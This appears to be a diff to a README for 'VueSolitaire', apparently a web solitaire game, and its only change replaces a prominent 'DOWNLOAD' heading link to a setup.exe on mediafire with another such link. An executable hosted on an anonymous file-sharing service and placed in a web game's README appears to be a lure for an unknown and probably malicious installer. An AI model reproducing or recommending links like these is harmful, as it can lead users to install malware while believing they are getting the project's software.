@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://download1493.mediafire.com/adz3dfh5s6lg/jz21rwk3jjd38ml/setup.exe">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://download1655.mediafire.com/0gkpp13h0msg/um5h2k47alqrkct/setup.exe">DOWNLOAD</a></h1>
 
 ## Description
 
